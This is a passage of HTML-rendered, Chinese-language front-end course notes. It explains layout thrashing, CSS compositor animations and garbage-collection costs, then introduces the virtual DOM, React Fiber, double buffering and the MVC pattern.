class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token comment">// 为了避免强制同步布局，在修改 DOM 之前查询相关值</span>\n  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>main_div<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">let</span> new_node <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'li\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">let</span> textnode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">\'time.geekbang\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  new_node<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>textnode<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id="避免布局抖动"><a href="#%E9%81%BF%E5%85%8D%E5%B8%83%E5%B1%80%E6%8A%96%E5%8A%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免布局抖动</h3>\n<p>还有一种比强制同步布局更坏的情况，那就是布局抖动。所谓布局抖动，是指在一次 JavaScript 执行过程中，多次执行强制布局和抖动操作。为了直观理解，你可以看下面的代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="36668681629116383000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`function foo() {\n  let time_li = document.getElementById(\'time_li\');\n  for (let i = 0; i < 100; i++) {\n    let main_div = document.getElementById(\'mian_div\');\n    let new_node = document.createElement(\'li\');\n    let textnode = document.createTextNode(\'time.geekbang\');\n    new_node.appendChild(textnode);\n    new_node.offsetHeight = time_li.offsetHeight;\n    document.getElementById(\'mian_div\').appendChild(new_node);\n  }\n}`, `36668681629116383000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">let</span> time_li <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'time_li\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token keyword">let</span> main_div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">let</span> new_node <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'li\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">let</span> textnode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">\'time.geekbang\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    new_node<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>textnode<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    new_node<span class="token punctuation">.</span>offsetHeight <span class="token operator">=</span> time_li<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">;</span>\n    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>我们在一个 for 循环语句里面不断读取属性值，每次读取属性值之前都要进行计算样式和布局。执行代码之后，使用 Performance 记录的状态如下所示</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-30-08-78f6365a27f9266e2c021f1cc62b44e1-9ea27.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 42.68456375838927%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABN0lEQVQoz5VRy06DUBTkL93p7+hKF+5MShN1U+2DisUWo4AELlAwMaUPLU00MalieaRAixTwUI0l1sQ4mdzMnTNz7uJivu/Pgn8DWosowoTWflc8GN0WDa1oqAVDw0cgNHzJAujsqubMTONDteC5Y4xpXomsLHES4hDiFOlGQayIOElk24iTwRRYUWAVgYEpUnhJ5mUYKXzbm3pYt0IO6tRdiQD2qlS/TqnH5U6ZHFGXj+fUoFIzqsRzszms1PQTQj8969ca9yTdJyh/YmFphiT9wrdIwygmO7OSNm/1wovuvKGHphdniWQVw9I1LMepOY03cAe4deRuHroglKd38OPV/l/Ly9OdJTu0v037e0ywex2AeHhd/FFOcoBkjsn6Mz/LYRjatu1+wnFsy5qYby/jMXztevkD9HPgqZLkbf8AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 30 08"\n        title=""\n        src="/static/2021-07-13-09-30-08-78f6365a27f9266e2c021f1cc62b44e1-fee1c.png"\n        srcset="/static/2021-07-13-09-30-08-78f6365a27f9266e2c021f1cc62b44e1-a67b7.png 200w,\n/static/2021-07-13-09-30-08-78f6365a27f9266e2c021f1cc62b44e1-0b187.png 400w,\n/static/2021-07-13-09-30-08-78f6365a27f9266e2c021f1cc62b44e1-fee1c.png 800w,\n/static/2021-07-13-09-30-08-78f6365a27f9266e2c021f1cc62b44e1-b1a91.png 1200w,\n/static/2021-07-13-09-30-08-78f6365a27f9266e2c021f1cc62b44e1-9ea27.png 1490w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从上图可以看出，在 foo 函数内部重复执行计算样式和布局，这会大大影响当前函数的执行效率。这种情况的避免方式和强制同步布局一样，都是尽量不要在修改 DOM 结构时再去查询一些相关值。</p>\n<h3 id="合理利用-css-合成动画"><a href="#%E5%90%88%E7%90%86%E5%88%A9%E7%94%A8-css-%E5%90%88%E6%88%90%E5%8A%A8%E7%94%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>合理利用 CSS 合成动画</h3>\n<p>合成动画是直接在合成线程上执行的，这和在主线程上执行的布局、绘制等操作不同，如果主线程被 JavaScript 或者一些布局任务占用，CSS 动画依然能继续执行。所以要尽量利用好 CSS 合成动画，如果能让 CSS 处理动画，就尽量交给 CSS 来操作。</p>\n<p>另外，如果能提前知道对某个元素执行动画操作，那就最好将其标记为 will-change，这是告诉渲染引擎需要将该元素单独生成一个图层。</p>\n<h3 id="避免频繁的垃圾回收"><a href="#%E9%81%BF%E5%85%8D%E9%A2%91%E7%B9%81%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免频繁的垃圾回收</h3>\n<p>我们知道 JavaScript 使用了自动垃圾回收机制，如果在一些函数中频繁创建临时对象，那么垃圾回收器也会频繁地去执行垃圾回收策略。这样当垃圾回收操作发生时，就会占用主线程，从而影响到其他任务的执行，严重的话还会让用户产生掉帧、不流畅的感觉。</p>\n<p>所以要尽量避免产生那些临时垃圾数据。那该怎么做呢？可以尽可能优化储存结构，尽可能避免小颗粒对象的产生。</p>\n<h2 id="总结-4"><a href="#%E6%80%BB%E7%BB%93-4" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们主要讲解了如何系统优化加载阶段和交互阶段的页面。</p>\n<p>在加载阶段，核心的优化原则是：优化关键资源的加载速度，减少关键资源的个数，降低关键资源的 RTT 次数。</p>\n<p>在交互阶段，核心的优化原则是：尽量减少一帧的生成时间。可以通过减少单次 JavaScript 的执行时间、避免强制同步布局、避免布局抖动、尽量采用 CSS 的合成动画、避免频繁的垃圾回收等方式来减少一帧生成的时长。</p>\n<h1 id="虚拟-dom：虚拟-dom-和实际-dom-有何不同"><a href="#%E8%99%9A%E6%8B%9F-dom%EF%BC%9A%E8%99%9A%E6%8B%9F-dom-%E5%92%8C%E5%AE%9E%E9%99%85-dom-%E6%9C%89%E4%BD%95%E4%B8%8D%E5%90%8C" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>虚拟 DOM：虚拟 DOM 和实际 DOM 有何不同</h1>\n<p>虚拟 DOM 是最近非常火的技术，两大著名前端框架 React 和 Vue 都使用了虚拟 DOM，所以我觉得非常有必要结合浏览器的工作机制对虚拟 DOM 进行一次分析。当然了，React 和 Vue 框架本身所蕴含的知识点非常多，而且也不是我们专栏的重点，所以在这里我们还是把重心聚焦在虚拟 DOM 上。</p>\n<p>在本文我们会先聊聊 DOM 的一些缺陷，然后在此基础上介绍虚拟 DOM 是如何解决这些缺陷的，最后再站在双缓存和 MVC 的视角来聊聊虚拟 DOM。理解了这些会让你对目前的前端框架有一个更加底层的认识，这也有助于你更好地理解这些前端框架。</p>\n<h2 id="dom-的缺陷"><a href="#dom-%E7%9A%84%E7%BC%BA%E9%99%B7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DOM 的缺陷</h2>\n<p>通过前面一系列文章的学习，你对 DOM 的生成过程应该已经有了比较深刻的理解，并且也知道了通过 JavaScript 操纵 DOM 是会影响到整个渲染流水线的。另外，DOM 还提供了一组 JavaScript 接口用来遍历或者修改节点，这套接口包含了 getElementById、removeChild、appendChild 等方法。</p>\n<p>比如，我们可以调用 <code class="language-text">document.body.appendChild(node)</code> 往 body 节点上添加一个元素，调用该 API 之后会引发一系列的连锁反应。首先渲染引擎会将 node 节点添加到 body 节点之上，然后触发样式计算、布局、绘制、栅格化、合成等任务，我们把这一过程称为重排。除了重排之外，还有可能引起重绘或者合成操作，形象地理解就是“牵一发而动全身”。另外，对于 DOM 的不当操作还有可能引发强制同步布局和布局抖动的问题，这些操作都会大大降低渲染效率。因此，对于 DOM 的操作我们时刻都需要非常小心谨慎。</p>\n<p>当然，对于简单的页面来说，其 DOM 结构还是比较简单的，所以以上这些操作 DOM 的问题并不会对用户体验产生太多影响。但是对于一些复杂的页面或者目前使用非常多的单页应用来说，其 DOM 结构是非常复杂的，而且还需要不断地去修改 DOM 树，每次操作 DOM 渲染引擎都需要进行重排、重绘或者合成等操作，因为 DOM 结构复杂，所生成的页面结构也会很复杂，对于这些复杂的页面，执行一次重排或者重绘操作都是非常耗时的，这就给我们带来了真正的性能问题。</p>\n<p>所以我们需要有一种方式来减少 JavaScript 对 DOM 的操作，这时候虚拟 DOM 就上场了</p>\n<h2 id="什么是虚拟-dom"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%99%9A%E6%8B%9F-dom" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是虚拟 DOM</h2>\n<p>在谈论什么是虚拟 DOM 之前，我们先来看看虚拟 DOM 到底要解决哪些事情。</p>\n<ul>\n<li>将页面改变的内容应用到虚拟 DOM 上，而不是直接应用到 DOM 上。</li>\n<li>变化被应用到虚拟 DOM 上时，虚拟 DOM 并不急着去渲染页面，而仅仅是调整虚拟 DOM 的内部状态，这样操作虚拟 DOM 的代价就变得非常轻了。</li>\n<li>在虚拟 DOM 收集到足够的改变时，再把这些变化一次性应用到真实的 DOM 上。</li>\n</ul>\n<p>基于以上三点，我们再来看看什么是虚拟 DOM。为了直观理解，你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-32-19-c94f25db6854093a879f5e720abac50f-5fd75.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 39.56043956043956%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+klEQVQY03VQgW6FIAzk///Q5OUtcXn6BEUFBQoUduqybIm7ENJC766tKKXknLWeIhECpPVESIX5O75QkuecGK+gcMWnoBid91KNRAjjsizWWu/2ZoirSwjWdd026wMl1Zh56Pv+pcxn9x5XElZPz8fz4yUXJcNmIQT/FKNUkxonf6ZwCyEM7w4qaMERj5a2wALNUfAhePIeHODosNacEmjOOe9cZZZSGmN+hrogkEMYnMyHA6ovK3jie3NO9Z15NBip/mKW8wjU7fvetu08z6CZE5DQWuPGIqBdOdc7iEPmxJ/FloK1YVWQrv9D3L6mlK6141ZKIb0t+wK5VdKbD9gyNQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 32 19"\n        title=""\n        src="/static/2021-07-13-09-32-19-c94f25db6854093a879f5e720abac50f-fee1c.png"\n        srcset="/static/2021-07-13-09-32-19-c94f25db6854093a879f5e720abac50f-a67b7.png 200w,\n/static/2021-07-13-09-32-19-c94f25db6854093a879f5e720abac50f-0b187.png 400w,\n/static/2021-07-13-09-32-19-c94f25db6854093a879f5e720abac50f-fee1c.png 800w,\n/static/2021-07-13-09-32-19-c94f25db6854093a879f5e720abac50f-b1a91.png 1200w,\n/static/2021-07-13-09-32-19-c94f25db6854093a879f5e720abac50f-5fd75.png 1456w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>该图是我结合 React 流程画的一张虚拟 DOM 执行流程图，下面我们就结合这张图来分析下虚拟 DOM 到底怎么运行的。</p>\n<ul>\n<li>创建阶段。首先依据 JSX 和基础数据创建出来虚拟 DOM，它反映了真实的 DOM 树的结构。然后由虚拟 DOM 树创建出真实 DOM 树，真实的 DOM 树生成完后，再触发渲染流水线往屏幕输出页面。</li>\n<li>更新阶段。如果数据发生了改变，那么就需要根据新的数据创建一个新的虚拟 DOM 树；然后 React 比较两个树，找出变化的地方，并把变化的地方一次性更新到真实的 DOM 树上；最后渲染引擎更新渲染流水线，并生成新的页面</li>\n</ul>\n<p>既然聊到虚拟 DOM 的更新，那我们就不得不聊聊最新的 React Fiber 更新机制。通过上图我们知道，当有数据更新时，React 会生成一个新的虚拟 DOM，然后拿新的虚拟 DOM 和之前的虚拟 DOM 进行比较，这个过程会找出变化的节点，然后再将变化的节点应用到 DOM 上。</p>\n<p>这里我们重点关注下比较过程，最开始的时候，比较两个虚拟 DOM 的过程是在一个递归函数里执行的，其核心算法是 reconciliation。通常情况下，这个比较过程执行得很快，不过当虚拟 DOM 比较复杂的时候，执行比较函数就有可能占据主线程比较久的时间，这样就会导致其他任务的等待，造成页面卡顿。为了解决这个问题，React 团队重写了 reconciliation 算法，新的算法称为 Fiber reconciler，之前老的算法称为 Stack reconciler。</p>\n<p>在前面我们介绍了协程，其实协程的另外一个称呼就是 Fiber，所以在这里我们可以把 Fiber 和协程关联起来，那么所谓的 Fiber reconciler 相信你也很清楚了，就是在执行算法的过程中出让主线程，这样就解决了 Stack reconciler 函数占用时间过久的问题。至于具体的实现过程在这里我就不详细分析了，如果感兴趣的话，你可以自行查阅相关资料进行学习。</p>\n<p>了解完虚拟 DOM 的大致执行流程，你应该也就知道为何需要虚拟 DOM 了。不过以上都从单纯的技术视角来分析虚拟 DOM 的，那接下来我们再从双缓存和 MVC 模型这两个视角来聊聊虚拟 DOM。</p>\n<h3 id="双缓存"><a href="#%E5%8F%8C%E7%BC%93%E5%AD%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>双缓存</h3>\n<p>在开发游戏或者处理其他图像的过程中，屏幕从前缓冲区读取数据然后显示。但是很多图形操作都很复杂且需要大量的运算，比如一幅完整的画面，可能需要计算多次才能完成，如果每次计算完一部分图像，就将其写入缓冲区，那么就会造成一个后果，那就是在显示一个稍微复杂点的图像的过程中，你看到的页面效果可能是一部分一部分地显示出来，因此在刷新页面的过程中，会让用户感受到界面的闪烁。</p>\n<p>而使用双缓存，可以让你先将计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定。</p>\n<p>在这里，你可以把虚拟 DOM 看成是 DOM 的一个 buffer，和图形显示一样，它会在完成一次完整的操作之后，再把结果应用到 DOM 上，这样就能减少一些不必要的更新，同时还能保证 DOM 的稳定输出。</p>\n<h3 id="mvc-模式"><a href="#mvc-%E6%A8%A1%E5%BC%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MVC 模式</h3>\n<p>到这里我们了解了虚拟 DOM 是一种类似双缓存的实现。不过如果站在技术角度来理解虚拟缓存，依然不能全面理解其含义。那么接下来我们再来看看虚拟 DOM 在 MVC 模式中所扮演的角色。</p>\n<p>在各大设计模式当中，MVC 是一个非常重要且应用广泛的模式，因为它能将数据和视图进行分离，在涉及到一些复杂的项目时，能够大大减轻项目的耦合度，使得程序易于维护。</p>\n<p>关于 MVC 的基础结构，你可以先参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-33-49-994da06d1189b0fa8a858d692fe207cf-4a0d2.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 92.54032258064515%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACfklEQVQ4y6VUWU8TURTu7zLxxUTtgwuLMXF9wAQNRBNJjOiDgUQNJpJIgkAohQhIgIKVRSBsNjURXNgCNtBSKLWddrrMcmfp7Z07t96ZQlNahBhPbk4yZ873nXO+e2Ysmf8wy9FholOn+t2JqTqN28tF/gHMzTcG35xSvfNGRMcngomRBoGW3NWEsLr7VVy0p6MejQ/S+gSnjwMTk17+NRFqPRu2l7GO6pizhnVUhW2XmK5ylNwp6P9I8Hio+QxjL4v0VUT777ADlWHbRaajBCX8J4OlNWew6TTTeYXpLGfspZHu6+E2a6jNihI7BcNbinWiFZLTL6S1YWljTPZMSusj8sZ4cvr5geykAGzqlJYTU/W8u5kKBpk1LLHZPKKl9ZSIQQTFvTSSCixilc+yWHJkVN5w+4VI9zUYWkZxHwas2SQye9nGUgyDqLDQTi+Pm2nItmnJvySN/50KfKNtp9nNXNAk12FohSBVXh+Jj9XS5cmrnDMMCefHMQ/RlMKtgSKKbhCkYC5waGYVESmlizDDiUrMv5zYWVXJIWF0apmMElwCgaWUqiCoYpLBuglucim3esQHw+DpuFLjlG73CK9m9yvrJsPPoPboo/xkBLyc5Bpd8NknmT6+nlMMcMOMUmIT7g6A2lGp2gFKO4S6CXl/DnMjPnvRZZtwtUusHpIffgA3uwHNvz8kGeD6SfncW/7GO7FqkL4QrS3841EpHzy3lT7fwpfbhYo+8d4AqHgvWlv5yn5ggF0+1PsdDi7DoVXoWIG9P+DsJjrQ2fARUZ/dQjTNvY2++A0/50ULAc1yzLdO8jT768+AqlJ82GiUZVmfz+fxePb2goa8RecPNnsH8xEeRBgAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 33 49"\n        title=""\n        src="/static/2021-07-13-09-33-49-994da06d1189b0fa8a858d692fe207cf-fee1c.png"\n        srcset="/static/2021-07-13-09-33-49-994da06d1189b0fa8a858d692fe207cf-a67b7.png 200w,\n/static/2021-07-13-09-33-49-994da06d1189b0fa8a858d692fe207cf-0b187.png 400w,\n/static/2021-07-13-09-33-49-994da06d1189b0fa8a858d692fe207cf-fee1c.png 800w,\n/static/2021-07-13-09-33-49-994da06d1189b0fa8a858d692fe207cf-4a0d2.png 992w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过上图你可以发现，MVC 的整体结构比较简单，由模型、视图和控制器组成，其核心思想就是将数据和视图分离，也就是说视图和模型之间是不允许直接通信的，它们之间的通信都是通过控制器来完成的。通常情况下的通信路径是视图发生了改变，然后通知控制器，控制器再根据情况判断是否需要更新模型数据。当然还可以根据不同的通信路径和控制器不同的实现方式，基于 MVC 又能衍生出很多其他的模式，如 MVP、MVVM 等，不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。</p>\n<p>所以在分析基于 React 或者 Vue 这些前端框架时，我们需要先重点把握大的 MVC 骨架结构，然后再重点查看通信方式和控制器的具体实现方式，这样我们就能从架构的视角来理解这些前端框架了。比如在分析 React 项目时，我们可以把 React 的部分看成是一个 MVC 中的视图，在项目中结合 Redux 就可以构建一个 MVC 的模型结构，如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-34-07-84ff3dbb02e1fa28f5af094d47ff1f46-71011.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 46.21513944223108%; position: relative; bottom: 0; left: 0; background-image: 